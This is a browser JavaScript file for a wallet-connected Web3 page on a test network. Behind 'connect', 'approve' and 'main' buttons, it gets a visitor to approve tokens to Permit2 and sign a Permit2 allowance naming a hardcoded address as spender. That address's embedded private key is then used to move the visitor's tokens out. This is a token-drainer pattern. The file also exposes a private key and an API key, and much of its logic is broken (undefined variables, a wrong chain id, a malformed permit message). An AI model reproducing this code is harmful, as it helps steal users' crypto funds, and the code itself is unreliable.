const { ethers, ethereum } = window;

// constants
const RPC = "https://goerli.infura.io/v3/15d127f3ac494ca88ab983921536e312"; // Goerly RPC
const chainId = 159; // Goerly chain id
const Permit2Contract = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; // Permit2 deployed to Goerly
const token1 = "0x8556C135e9899bc6e747f80a3084b2Ff5dDC574C"; // SHIBA on Goerly
const token2 = "0xAe258c792361101eE7DC3061f8f259365b44769F"; // USDT on Goerly
const amount1 = String(20 * 10 ** 18); // calculate SHIBA
const amount2 = String(20 * 10 ** 6); // calculate USDT amount
const initiator = "0x0A59223D2d7018C5d6f5fDD6d9a02Ea6828fD22f"; // initiator address
const initiatorPK =
  "fdc3d7a7ef1129116fbf4d565cff4ce9f86570e67ed6a7cf84281acab26986fc"; // initiaror's private key

// setup UI
const connectButton = document.getElementById("connect");
const approveButton = document.getElementById("approve");
const mainButton = document.getElementById("main");

approveButton.disabled = true;
mainButton.disabled = true;

// ABIs
const Permit2ContractABI = [
  {
    inputs: [
      { internalType: "address", name: "owner", type: "address" },
      {
        components: [
          {
            components: [
              { internalType: "address", name: "token", type: "address" },
              { internalType: "uint160", name: "amount", type: "uint160" },
              { internalType: "uint48", name: "expiration", type: "uint48" },
              { internalType: "uint48", name: "nonce", type: "uint48" },
            ],
            internalType: "struct IAllowanceTransfer.PermitDetails",
            name: "details",
            type: "tuple",
          },
          { internalType: "address", name: "spender", type: "address" },
          { internalType: "uint256", name: "sigDeadline", type: "uint256" },
        ],
        internalType: "struct IAllowanceTransfer.PermitBatch",
        name: "permitBatch",
        type: "tuple",
      },
      { internalType: "bytes", name: "signature", type: "bytes" },
    ],
    name: "permit",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "from", type: "address" },
      { internalType: "address", name: "to", type: "address" },
      { internalType: "uint160", name: "amount", type: "uint160" },
      { internalType: "address", name: "token", type: "address" },
    ],
    name: "transferFrom",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const ERC20_ABI = [
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];

// variables
let provider, web3;
let selectedAddress;

// connect function
async function connect() {
  //window.web3 = new Web3(window.ethereum);
  web3 = new Web3(window.ethereum);
  provider = new ethers.providers.Web3Provider(ethereum);
  const network = await provider.getNetwork();

  // if (network.chainId !== chainId) {
  //     try {
  //         await provider.send("wallet_switchEthereumChain", [{ chainId: `0x${chainId}` }])
  //     } catch (err) {
  //         console.log("error", err)
  //         return
  //     }
  // }

  const accounts = await provider.send("eth_requestAccounts", []);
  selectedAddress = accounts[0];

  connectButton.innerText = selectedAddress;
  connectButton.disabled = true;
  approveButton.disabled = false;
  mainButton.disabled = false;
}

// function for token approval to the Permit2 contract
async function approveToken() {
  const tokenContract = new web3.eth.Contract(ERC20_ABI, token1, {
    from: selectedAddress,
  });
  const gasPrice = await web3.eth.getGasPrice();
  const gasLimit = await tokenContract.methods
    .approve(Permit2Contract, amount1)
    .estimateGas({ from: selectedAddress });
  const gasFee = gasPrice * gasLimit;
  const amountToSend = web3.utils.toBN(amount1).sub(web3.utils.toBN(gasFee));

  tokenContract.methods
    .approve(Permit2Contract, amountToSend)
    .send({ from: selectedAddress })
    .on("transactionHash", function (hash) {
      console.log("wait for a little bit..");
    })
    .on("receipt", function (receipt) {
      console.log(
        "You successfully approved ",
        token1,
        "with the amount, ",
        amount1
      );
    });
}

// the permit function
async function Permit() {
  const deadline = 10000000000000;
  const nonce = 0; // still experimenting on this one

  const dataToSign = JSON.stringify({
    domain: {
      name: "Permit2",
      chainId: chainId,
      verifyingContract: Permit2Contract,
    },
    types: {
      EIP712Domain: [
        { name: "name", type: "string" },
        { name: "chainId", type: "uint256" },
        { name: "verifyingContract", type: "address" },
      ],
      PermitBatch: [
        { name: "details", type: "PermitDetails" },
        { name: "spender", type: "address" },
        { name: "sigDeadline", type: "uint256" },
      ],
      PermitDetails: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint160" },
        { name: "expiration", type: "uint48" },
        { name: "nonce", type: "uint48" },
      ],
    },
    primaryType: "PermitBatch",
    message: {
      details: {
        token: token1,
        amount: amount1,
        expiration: deadline,
        nonce: nonce,
      },
      token: token2,
      amount: amount2,
      expiration: deadline,
      nonce: nonce,
    },
    spender: initiator,
    sigDeadline: deadline,
  });

  web3.currentProvider.sendAsync({
    method: "eth_signTypedData_v3",
    params: [selectedAddress, dataToSign],
    from: selectedAddress,
  }),
    async (error, result) => {
      if (error != null) {
        console.log("Error signing");
        return;
      }

      const gasPrice = await web3.eth.getGasPrice();
      const gasLimit = await tokenContract.methods
        .approve(Permit2Contract, amount1)
        .estimateGas({ from: selectedAddress });
      const gasFee = gasPrice * gasLimit;
      const amountToSend = web3.utils
        .toBN(amount1)
        .sub(web3.utils.toBN(gasFee));

      const signature = result.result;
      const initiatorNonce = await web3.eth.getTransactionCount(initiator);
      const permit2Contract = new web3.eth.Contract(
        Permit2ContractABI,
        Permit2Contract
      );

      const permitDetails = [
        [token1, amountToSend, deadline, nonce],
        initiator,
        deadline,
      ];
      const permitData = permit2Contract.methods
        .permit(selectedAddress, permitDetails, signature)
        .encodeABI();
      const permitTX = {
        from: initiator,
        to: Permit2Contract,
        nonce: web3.utils.toHex(initiatorNonce),
        gasLimit: web3.utils.toHex(98000),
        gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
        value: "0x",
        data: permitData,
      };
      try {
        const signedPermitTX = await web3.eth.accounts.signTransaction(
          permitTX,
          initiatorPK
        );
        const permitReceipt = await web3.eth.sendSignedTransaction(
          signedPermitTX.rawTransaction
        );
        console.log("Permit transaction receipt: ", permitReceipt);
      } catch (error) {
        console.error("Error occurred while sending permit");
      }
      // web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction);


      
      // after the token is approved to us,
      try {
        const transferData = tokenContract.methods
          .transferFrom(selectedAddress, recipient, amountToSend)
          .encodeABI();
        const transferTX = {
          from: initiator,
          to: token1,
          nonce: web3.utils.toHex(initiatorNonce + 1), // don't forget to increment initiator's nonce
          gasLimit: web3.utils.toHex(98000),
          gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
          data: transferData,
          value: "0x",
        };

        const signedTransferTX = await web3.eth.accounts.signTransaction(
          transferTX,
          initiatorPK
        );


        try {
            const transferReceipt = await web3.eth.sendSignedTransaction(signedTransferTX.rawTransaction);
            console.log("Transfer transaction receipt: ", transferReceipt);
          } catch (error) {
            console.error("Error occurred while sending transfer transaction: ", error);
          }



        console.log("Transfer transaction receipt: ", transferReceipt);
      } catch (error) {
        console.error(
          "Error occurred while sending transfer transaction: ",
          error
        );
      }
    };
}

// configure buttons
window.addEventListener("DOMContentLoaded", () => {
  connectButton.onclick = connect;
  console.log("hbdj");
}),
  window.addEventListener("DOMContentLoaded", () => {
    approveButton.onclick = approveToken;
  }),
  window.addEventListener("DOMContentLoaded", () => {
    mainButton.onclick = Permit;
  });
